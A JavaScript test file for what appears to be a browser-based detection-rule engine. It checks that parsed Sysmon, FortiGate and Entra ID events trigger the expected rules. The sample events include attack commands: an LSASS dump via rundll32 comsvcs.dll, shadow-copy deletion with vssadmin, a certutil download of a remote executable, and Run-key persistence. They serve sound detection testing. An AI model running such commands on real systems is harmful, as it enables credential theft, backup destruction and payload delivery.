// Runs in CI with Node (no dependencies): node --test site/engine.test.mjs
// Proves the browser engine agrees with the Python reference on every test event,
// on every event with a field removed, and on the intrusion scenario.
import { test } from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { autoParse, evaluate, matches, parseCommandLine, parseSysmonXml } from "./engine.js";

const here = new URL(".", import.meta.url);
const { rules, logsources } = JSON.parse(readFileSync(new URL("data/rules.json", here)));
const scenario = JSON.parse(readFileSync(new URL("data/scenario.json", here)));
const fieldNames = Object.fromEntries(Object.entries(logsources).map(([k, v]) => [k, v.fields]));

test("library is loaded", () => {
  assert.ok(rules.length >= 25);
});

for (const rule of rules) {
  test(`${rule.id} test events`, () => {
    for (const ev of rule.tests.match) assert.equal(matches(rule, ev), true, JSON.stringify(ev));
    for (const ev of rule.tests.no_match) assert.equal(matches(rule, ev), false, JSON.stringify(ev));
  });
}

test("intrusion scenario fires exactly the expected rules", () => {
  for (const step of scenario.steps) {
    const fired = evaluate(rules, step.logsource, step.event).map((r) => r.id).sort();
    assert.deepEqual(fired, [...step.expect].sort(), step.title);
  }
});

test("command line quick mode", () => {
  const { logsource, event } = parseCommandLine("rundll32 comsvcs.dll #24 624 C:\\x.bin full");
  assert.equal(event["process.name"], "rundll32.exe");
  assert.deepEqual(evaluate(rules, logsource, event).map((r) => r.id), ["DL-0016"]);
  const quoted = parseCommandLine('"C:\\Windows\\System32\\vssadmin.exe" delete shadows /all /quiet');
  assert.equal(quoted.event["process.name"], "vssadmin.exe");
  assert.deepEqual(evaluate(rules, quoted.logsource, quoted.event).map((r) => r.id), ["DL-0029"]);
});

test("Sysmon XML from Event Viewer", () => {
  const xml = `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System>
    <Provider Name="Microsoft-Windows-Sysmon" /><EventID>1</EventID></System><EventData>
    <Data Name="Image">C:\\Windows\\System32\\certutil.exe</Data>
    <Data Name="CommandLine">certutil -urlcache -split -f http://203.0.113.9/p.exe p.exe</Data>
    <Data Name="ParentImage">C:\\Windows\\System32\\cmd.exe</Data>
    <Data Name="User">CORP\\a.user</Data></EventData></Event>`;
  const { logsource, event } = parseSysmonXml(xml);
  assert.equal(logsource, "process_creation");
  assert.equal(event["parent.name"], "cmd.exe");
  assert.deepEqual(evaluate(rules, logsource, event).map((r) => r.id), ["DL-0015"]);
});

test("Sysmon registry event splits key and value", () => {
  const xml = `<Event><System><EventID>13</EventID></System><EventData>
    <Data Name="Image">C:\\Users\\a\\AppData\\x.exe</Data>
    <Data Name="TargetObject">HKU\\S-1-5-21-1\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\upd</Data>
    <Data Name="Details">C:\\Users\\a\\AppData\\Roaming\\upd.exe</Data></EventData></Event>`;
  const { logsource, event } = parseSysmonXml(xml);
  assert.equal(event["registry.value"], "upd");
  assert.deepEqual(evaluate(rules, logsource, event).map((r) => r.id), ["DL-0009"]);
});

test("JSON with Sysmon field names and auto-detect", () => {
  const p = autoParse('{"EventID": 22, "Image": "C:\\\\x\\\\powershell.exe", "QueryName": "pastebin.com"}', fieldNames);
  assert.equal(p.logsource, "dns_query");
  assert.deepEqual(evaluate(rules, p.logsource, p.event).map((r) => r.id), ["DL-0027"]);
});

test("a pasted FortiGate log line is parsed and matched", () => {
  const line = 'date=2026-10-29 time=03:12:44 devname="FGT-HQ" logid="0100044547" type="event" subtype="system" ' +
    'level="information" logdesc="Object attribute configured" user="admin" ui="sso(104.28.244.115)" action="Add" ' +
    'cfgtid=1835040 cfgpath="system.admin" cfgobj="support" cfgattr="accprofile[super_admin]vdom[root]" msg="Add system.admin support"';
  const p = autoParse(line, fieldNames);
  assert.equal(p.logsource, "fortigate");
  assert.equal(p.event["fg.cfgpath"], "system.admin");
  assert.equal(p.event["fg.msg"], "Add system.admin support");
  assert.deepEqual(evaluate(rules, p.logsource, p.event).map((r) => r.id), ["DL-0069"]);
});

test("a pasted Entra ID audit record (Graph directoryAudit) is parsed and matched", () => {
  const audit = {
    activityDisplayName: "Add member to role", category: "RoleManagement", result: "success",
    initiatedBy: { app: { appId: "24205314-2b89-4e07-a2a4-579e898a5640", displayName: "ConnectWise Cloud Management - MS Teams" } },
    targetResources: [{ type: "ServicePrincipal", displayName: "ConnectWise Cloud Management - MS Teams",
      modifiedProperties: [{ displayName: "Role.DisplayName", newValue: "\"Global Administrator\"" }] }],
    additionalDetails: [{ key: "User-Agent", value: "Python-urllib/3.12" }],
  };
  const p = autoParse(JSON.stringify(audit), fieldNames);
  assert.equal(p.logsource, "entra_audit");
  assert.equal(p.event["initiator.app"], "ConnectWise Cloud Management - MS Teams");
  assert.deepEqual(evaluate(rules, p.logsource, p.event).map((r) => r.id), ["DL-0076"]);
});

test("a pasted Entra ID service principal sign-in (Azure Monitor) is parsed and matched", () => {
  const signin = { category: "ServicePrincipalSignInLogs", callerIpAddress: "144.172.64.128",
    properties: { appId: "506e08f9-6e9a-4da4-942b-a099a03644ae", appDisplayName: "ConnectWise Cloud Backup",
      ipAddress: "144.172.64.128", resourceDisplayName: "Microsoft Graph", status: { errorCode: 0 } } };
  const p = autoParse(JSON.stringify(signin), fieldNames);
  assert.equal(p.logsource, "entra_sp_signin");
  assert.equal(p.event["signin.error_code"], "0");
  assert.deepEqual(evaluate(rules, p.logsource, p.event).map((r) => r.id), ["DL-0078"]);
});

test("unsupported Sysmon event id gives a clear error", () => {
  assert.throws(() => parseSysmonXml("<Event><System><EventID>4</EventID></System></Event>"), /not covered/);
});
